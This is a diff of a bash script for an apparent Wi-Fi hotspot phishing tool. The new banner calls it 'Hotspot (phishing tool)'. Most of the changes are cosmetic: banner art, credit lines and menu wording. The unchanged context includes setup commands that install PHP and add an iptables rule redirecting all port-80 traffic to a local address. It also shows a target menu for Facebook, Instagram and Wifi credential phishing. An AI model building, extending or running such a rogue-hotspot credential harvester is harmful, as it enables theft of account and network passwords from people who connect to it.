@@ -11,19 +11,25 @@ white="\e[97m"   # White
 function display_banner {
   echo -e "$green"
   cat << "EOF"
-           _ _  ___  ___  _    _      _             
-          | | |/ __>| . \| |_ <_> ___| |_  ___  _ _ 
-          |   |\__ \|  _/| . || |<_-<| . |/ ._>| '_>
-          |_|_|<___/|_|  |_|_||_|/__/|_|_|\___.|_|  
+.__            
+|  |__   ______
+|  |  \ /  ___/
+|   Y  \\___ \ 
+|___|  /____  >
+     \/     \/
+Hotspot (phishing tool) 
 EOF
   echo -e "$nc"
   echo -e "                 $yellow-+-$white Coded by:$red @HxRofo $yellow-+-\n $nc"
+  echo -e "$nc"
+  echo -e "                 $green</>$red | Recoded by:$white @CPScript $red | $green</>\n $nc"
   sleep 5
 }
 
 # Function to execute initial setup commands
 function execute_setup_commands {
-  echo -e "\e[33mInstalling and Setting up Tools\e[0m"  # Yellow color for setup message
+  echo -e "\e[33mSetting up tools\e[0m"  # Yellow color for setup message
+  sleep 5
 
   # Update package lists and install php and unzip
   apt update && apt install php unzip -y > /dev/null 2>&1
@@ -45,7 +51,7 @@ function execute_setup_commands {
   iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP
   clear
   sleep 1
-  echo -e "\e[1m\e[32mWe're Good to Go!\e[0m"  # Bold and green color for success message
+  echo -e "\e[1m\e[32mFinished, loading HS tool\e[0m"  # Bold and green color for success message
   sleep 1
 }
 
@@ -113,7 +119,7 @@ function main_menu {
   # Display the banner and menu at the same time
   display_banner
 
-  echo -e "\n\e[1m\e[32mAttacks Menu\e[0m\n"  # Bold and green color for "Attacks Menu"
+  echo -e "\n\e[1m\e[32m---______Menu______---\e[0m\n"  # Bold and green color for "Attacks Menu"
   echo -e "\e[1m\e[31m[1]\e[0m \e[1mFacebook\e[0m"
   echo -e "\e[1m\e[31m[2]\e[0m \e[1mInstagram\e[0m"
   echo -e "\e[1m\e[31m[3]\e[0m \e[1mWifi\e[0m"
@@ -124,7 +130,7 @@ function main_menu {
   echo -e "\e[1m\e[31m[x]\e[0m \e[1mExit\e[0m"
 
  # Prompt in bold yellow color
-  read -p $'\e[1m\e[33mChoose Target and hit Enter: \e[0m' choice
+  read -p $'\e[1m\e[33mChoose Option: \e[0m' choice
 
   case $choice in
     1)
